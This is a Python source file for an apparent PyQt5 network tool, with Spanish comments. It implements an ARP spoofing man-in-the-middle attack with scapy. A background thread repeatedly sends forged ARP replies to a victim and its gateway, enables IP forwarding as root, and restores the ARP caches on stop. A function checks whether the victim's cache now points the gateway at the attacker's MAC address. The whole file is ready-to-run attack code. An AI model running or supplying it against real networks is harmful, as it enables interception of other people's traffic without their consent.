# src/core/arp_spoof.py

import os
from PyQt5.QtCore import QThread, pyqtSignal
from scapy.all import (
    Ether, ARP, sendp, getmacbyip,
    get_if_hwaddr, conf, srp
)

class ARPSpoofThread(QThread):
    finished = pyqtSignal()

    def __init__(self, target_ip, gateway_ip, interval=2, parent=None):
        super().__init__(parent)
        self.target_ip  = target_ip
        self.gateway_ip = gateway_ip
        self.interval   = interval
        self.running    = True

    def restore_arp(self, iface, tmac, gmac):
        sendp(Ether(dst=tmac)/ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwsrc=gmac),
              iface=iface, verbose=False)
        sendp(Ether(dst=gmac)/ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwsrc=tmac),
              iface=iface, verbose=False)

    def run(self):
        iface   = conf.iface
        our_mac = get_if_hwaddr(iface)
        tmac    = getmacbyip(self.target_ip)
        gmac    = getmacbyip(self.gateway_ip)

        if os.geteuid() != 0:
            raise PermissionError("Must run as root")
        if not tmac or not gmac:
            print("[!] Could not get MACs. Aborting.")
            return
        if os.name != 'nt':
            os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

        pt = Ether(dst=tmac)/ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwsrc=our_mac)
        pg = Ether(dst=gmac)/ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwsrc=our_mac)

        while self.running:
            sendp(pt, iface=iface, verbose=False)
            sendp(pg, iface=iface, verbose=False)
            self.msleep(self.interval * 1000)

        self.restore_arp(iface, tmac, gmac)
        self.finished.emit()

    def stop(self):
        self.running = False

def check_arp_spoof_success(victim_ip: str, gateway_ip: str) -> bool:
    """
    Verifica en la caché ARP de la VÍCTIMA si la IP del gateway
    está asociada a la MAC del atacante.
    """
    iface        = conf.iface
    attacker_mac = get_if_hwaddr(iface).lower()

    # 1) Necesitamos la MAC de la víctima para dirigirle el ARP request
    victim_mac = getmacbyip(victim_ip)
    if not victim_mac:
        return False

    # 2) Hacemos que la víctima pregunte: "¿Quién tiene gateway_ip?"
    arp_req = Ether(dst=victim_mac) / ARP(op=1, pdst=gateway_ip)
    ans, _  = srp(arp_req, iface=iface, timeout=3, retry=2, verbose=False)

    # 3) Si responde, comprobamos si usa nuestra MAC
    for _, resp in ans:
        if resp.hwsrc.lower() == attacker_mac:
            return True

    return False